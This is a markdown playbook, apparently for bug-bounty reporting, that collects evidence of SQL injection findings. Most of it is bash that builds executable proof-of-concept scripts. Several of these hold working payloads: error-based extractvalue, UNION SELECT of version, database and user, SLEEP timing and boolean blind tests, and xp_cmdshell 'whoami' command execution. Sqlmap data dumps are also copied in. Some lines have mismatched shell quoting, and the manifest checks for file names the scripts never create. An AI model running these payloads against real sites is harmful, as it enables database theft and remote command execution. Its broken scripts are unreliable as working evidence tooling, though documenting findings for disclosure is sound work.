# SQL Injection — Evidence Collection

## Purpose
Capture reproducible proof for every SQLi finding. Curl trace showing error/UNION output, sqlmap session dumps with database structure, data extraction screenshots, and timestamped manifests suitable for bug bounty submission.

## Required Variables
- `$TARGET_URL` — vulnerable endpoint
- `$DB_TYPE` — fingerprinted database
- `$TECHNIQUE` — exploitation technique used
- `$EVIDENCE_ROOT` — base evidence directory (`evidence/$TARGET/sqli/`)

## Commands

### Standard Evidence Template

```bash
export PATH="/opt/homebrew/bin:$HOME/go/bin:$HOME/Library/Python/3.14/bin:$PATH"

FINDING_ID="sqli_${TECHNIQUE}_$(date +%s)"
EVIDENCE_DIR="$EVIDENCE_ROOT/$FINDING_ID"
mkdir -p "$EVIDENCE_DIR"

date -u +%Y-%m-%dT%H:%M:%SZ > "$EVIDENCE_DIR/timestamp.txt"

{
  echo "sqlmap $(sqlmap --version 2>&1 | head -1)"
  echo "curl $(curl --version | head -1)"
  echo "python3 $(python3 --version)"
} > "$EVIDENCE_DIR/tool_versions.txt"
```

### Error-Based SQLi Evidence

```bash
# Reproduce the error with single quote
curl -sv "$TARGET_URL'" -o "$EVIDENCE_DIR/error_response_body.txt" 2>"$EVIDENCE_DIR/error_request_trace.txt"

# Extract the SQL error message for the report
grep -iE 'SQL syntax|MySQL|MariaDB|PostgreSQL|ORA-|SQL Server|Unclosed|syntax error|malformed' "$EVIDENCE_DIR/error_request_trace.txt" > "$EVIDENCE_DIR/error_message.txt"

# Error-based extraction evidence
cp "$OUTDIR/sqli/extract_dbname.txt" "$OUTDIR/sqli/tables_extracted.txt" "$OUTDIR/sqli/data_extracted.txt" "$EVIDENCE_DIR/" 2>/dev/null

cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
# SQLi Error-Based PoC — $FINDING_ID
echo "=== Single Quote Injection ==="
curl -s '$TARGET_URL' | head -20
echo ""
echo "=== Database Name via extractvalue ==="
curl -s '$TARGET_URL'$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -\"))") | head -5
POCEOF
chmod +x "$EVIDENCE_DIR/poc.sh"
```

### UNION-Based Evidence

```bash
ENCODED_UNION=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"' UNION SELECT @@version,database(),user()-- -\"))")
curl -sv "$TARGET_URL${ENCODED_UNION}" -o "$EVIDENCE_DIR/union_response.txt" 2>"$EVIDENCE_DIR/union_request_trace.txt"

cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
echo "=== UNION Exploitation ==="
curl -s '$TARGET_URL$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"' UNION SELECT @@version,database(),user()-- -\"))")'
echo ""
echo "=== Extracted data above: version | database() | user() ==="
POCEOF
chmod +x "$EVIDENCE_DIR/poc.sh"
```

### Blind SQLi Evidence

```bash
# Copy boolean/time differential output
cp "$OUTDIR/sqli/boolean_hits.txt" "$OUTDIR/sqli/time_hits.txt" "$OUTDIR/sqli/blind_extracted.txt" "$EVIDENCE_DIR/" 2>/dev/null

# Record timing differential
{
  echo "=== Timing Baseline ==="
  echo "Baseline: $(curl -s -o /dev/null -w '%{time_total}' '$TARGET_URL')s"
  echo "Injected:  $(curl -s -o /dev/null -w '%{time_total}' '${TARGET_URL}' OR SLEEP(5)-- -')s"
} > "$EVIDENCE_DIR/timing_differential.txt"

cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
echo "=== Boolean Blind PoC ==="
TRUE=\$(curl -s '$TARGET_URL' OR '1'='1' | wc -c)
FALSE=\$(curl -s '$TARGET_URL' AND '1'='2' | wc -c)
echo "TRUE response: \${TRUE} bytes"
echo "FALSE response: \${FALSE} bytes"
[ "\$TRUE" != "\$FALSE" ] && echo "DIFFERENTIAL CONFIRMED — SQLi present" || echo "Test failed"
POCEOF
chmod +x "$EVIDENCE_DIR/poc.sh"
```

### sqlmap Evidence

```bash
# Copy sqlmap session directory
cp -r "$OUTDIR/sqli/sqlmap_dump/" "$EVIDENCE_DIR/sqlmap_session/" 2>/dev/null

# Extract sqlmap log with key findings
grep -E 'back-end DBMS|database:|Table:|retrieved:|dump|command|shell|file written' "$OUTDIR/sqli/sqlmap_dump_output.txt" 2>/dev/null > "$EVIDENCE_DIR/sqlmap_key_findings.txt"

# Create data extraction summary
{
  echo "# SQLi Data Extraction Summary"
  echo "Target: $TARGET_URL"
  echo "DBMS: $DB_TYPE"
  echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo ""
  grep -c 'entry$' "$OUTDIR/sqli/sqlmap_dump/"*/*.csv 2>/dev/null | while read -r line; do
    echo "  $line"
  done
} > "$EVIDENCE_DIR/extraction_summary.md"
```

### Stacked Query / Command Execution Evidence

```bash
if [ -f "$OUTDIR/sqli/impact_os_whoami.txt" ]; then
  cp "$OUTDIR/sqli/impact_os_whoami.txt" "$EVIDENCE_DIR/os_command_output.txt"

  cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
echo "=== OS Command Execution via SQLi ==="
curl -s '$TARGET_URL$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"'; EXEC xp_cmdshell 'whoami'--\"))")'
echo ""
echo "=== If 'whoami' output visible above, RCE confirmed ==="
POCEOF
  chmod +x "$EVIDENCE_DIR/poc.sh"
fi
```

### Evidence Manifest

```bash
{
  echo "# SQLi Evidence Manifest — $FINDING_ID"
  echo ""
  echo "| Artifact | Description | Status |"
  echo "|----------|-------------|--------|"
  for f in request_trace.txt response_body.txt error_message.txt poc.sh sqlmap_session/ extraction_summary.md; do
    desc="$f"
    [ "$f" = "request_trace.txt" ] && desc="Full curl verbose trace"
    [ "$f" = "sqlmap_session/" ] && desc="sqlmap session directory"
    [ -e "$EVIDENCE_DIR/$f" ] && echo "| $f | $desc | present |" || echo "| $f | $desc | missing |"
  done
} > "$EVIDENCE_DIR/manifest.md"
```

## Detection Signals
- `request_trace.txt` contains SQL error → error-based evidence complete
- `union_response.txt` contains version/database/user string → UNION extraction documented
- `timing_differential.txt` shows >4s difference → blind SQLi timing evidence
- `sqlmap_key_findings.txt` non-empty → automated tool confirmed finding
- `os_command_output.txt` contains expected command output → command execution evidence

## Next
├── All evidence files verified non-empty → bundle for reporting skill
├── If sqlmap session copied → include in report appendix
├── If command execution confirmed → redact any output that contains sensitive data
└── Always → run `for f in "$EVIDENCE_DIR"/*; do [ -s "$f" ] || echo "EMPTY: $f"; done`